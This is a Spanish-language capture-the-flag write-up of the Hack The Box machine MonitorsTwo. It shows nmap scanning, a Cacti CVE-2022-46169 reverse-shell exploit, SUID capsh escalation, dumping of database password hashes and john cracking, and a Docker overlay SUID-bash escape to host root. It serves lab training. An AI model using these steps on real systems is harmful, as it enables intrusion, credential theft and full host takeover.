

![1](</Writeups/Maquinas/MonitorsTwoo/img/logo.png>)
By Rug4lo

## Reconocimiento

Primero empezamos con el típico escaneo con nmap
```bash
nmap -p- --open -T5 -sS -min-rate 5000 -vvv -n -Pn -oG allports 10.10.11.211
```
```bash
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.93 ( https://nmap.org ) at 2023-08-26 20:13 CEST
Initiating SYN Stealth Scan at 20:13
Scanning 10.10.11.211 [65535 ports]
Discovered open port 80/tcp on 10.10.11.211
Discovered open port 22/tcp on 10.10.11.211
Completed SYN Stealth Scan at 20:13, 13.76s elapsed (65535 total ports)
Nmap scan report for 10.10.11.211
Host is up, received user-set (0.11s latency).
Scanned at 2023-08-26 20:13:03 CEST for 14s
Not shown: 65121 closed tcp ports (reset), 412 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 13.89 seconds
           Raw packets sent: 68247 (3.003MB) | Rcvd: 66661 (2.666MB)
```
Después hacemos un escaneo enviando unos scripts básicos de reconocimiento 
```bash
nmap -sCV -p22,80 -oN targeted 10.10.11.211 
```
```bash
Starting Nmap 7.93 ( https://nmap.org ) at 2023-08-26 20:16 CEST
Nmap scan report for cacti.htb (10.10.11.211)
Host is up (0.12s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48add5b83a9fbcbef7e8201ef6bfdeae (RSA)
|   256 b7896c0b20ed49b2c1867c2992741c1f (ECDSA)
|_  256 18cd9d08a621a8b8b6f79f8d405154fb (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Login to Cacti
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.14 seconds
```

Ahora podemos ir a la pagina web que esta en el puerto 80

![1](</Writeups/Maquinas/MonitorsTwoo/img/1.png>)

## Explotación de la web

Podemos probar a hacer una SQLI pero veremos que no funcionara

Pero en este panel podemos ver la version, podemos buscar vulnerabilidades para esta version de cacti

Buscando encontré este proyecto, que usa una vulnerabilidad de esta version de cacti para mandarte una reverse shell

**Proyecto** ---> https://github.com/FredBrave/CVE-2022-46169-CACTI-1.2.22/tree/main

Usando esto podremos conseguir una consola interactiva de la maquina

Primero que todo nos ponemos en escucha en el puerto que queramos 
```bash
nc -nlvp 4646
```
Después ejecutamos la herramienta .py indicandole nuestra ip, el puerto por donde nos tiene que mandar la consola y la ip de la maquina
```bash
python3 CVE-2022-46169.py  -u http://10.10.11.211 --LHOST=10.10.14.89 --LPORT=4646
```
```bash
Checking...
The target is vulnerable. Exploiting...
Bruteforcing the host_id and local_data_ids
Bruteforce Success!!
```
Ahora tenemos acceso a la consola, pero si hacemos un whoami podremos ver que estamos dentro de un Docker
```bash
whoami
```
```bash
www-data
```

## Escalada de privilegios en el docker

Ahora buscamos alguna manera de escalar privilegios, 
```bash
find / -perm -4000 2>/dev/null
```
Encontramos un archivo llamado capsh, el cual podemos usar para convertirnos en root, de esta manera:
```bash
capsh --gid=0 --uid=0 --
```

## Explotación de la base de datos

Una vez que tengamos root vamos a ir a la raiz y vamos a hacer un cat al archivo **entrypoint.sh**

Este nos mostrara como entrar a la base de datos del servidor
```bash
mysql --host=db --user=root --password=root cacti
```
Al usar este comando entramos directamente a la base de datos cacti, por lo que no es necesario listar bases de datos

Ahora podemos listar las tablas 
```bash
 MySQL [(cacti)]> show tables;
```
La que nos interesa es la user_auth 

Si vemos su contenido obtendremos la contraseña del usuario para el ssh (la del root no funcionara)
```bash
  MySQL [cacti]> select username, password from user_auth;
```
```bash
  +----------+--------------------------------------------------------------+
  | username | password                                                     |
  +----------+--------------------------------------------------------------+
  | admin    | $2y$10$IhEA.Og8vrvwueM7VEDkUes3pwc3zaBbQ/iuqMft/llx8utpR1hjC |
  | guest    | 43e9a4ab75570f5b                                             |
  | marcus   | $2y$10$vcrYth5Y.contraseña                                   |
  +----------+--------------------------------------------------------------+
```
Ahora con john podemos desencriptar el hash (en el archivo hash tiene que estar el hash de marcus)
```bash
john --wordlist=/opt/rockyou.txt hash
```

## Escalada de privilegios en la maquina principal

Ahora podemos conectarnos al usuario marcus con ssh, pero no cierres la consola del docker, se necesita mas adelante

Ahora que estamos como usuario marcus podemos ver la flag del usuario, la cual estará en el home 

![1](</Writeups/Maquinas/MonitorsTwoo/img/2.png>)


Perfecto, ahora toca ir a por la flag del root, para esto necesitaremos escalar privilegios, pero no hay ninguna manera a simple vista

Por eso usaremos la terminal que tenemos en el docker con permisos root, y le daremos permisos a la bash
```bash
chmod u+s /bin/bash 
```
Pero le hemos dado permisos a la bash del contenedor y no de la maquina principal

Por lo que con el usuario Marcus tenemos que irnos a esta ruta 
```bash
/var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged
```
Y cuando estemos ahí ejecutamos la bash
```bash
bin/bash -p
```
Esto nos dará una consola como root

Ahora solo toca ir a la carpeta root y ver la flag 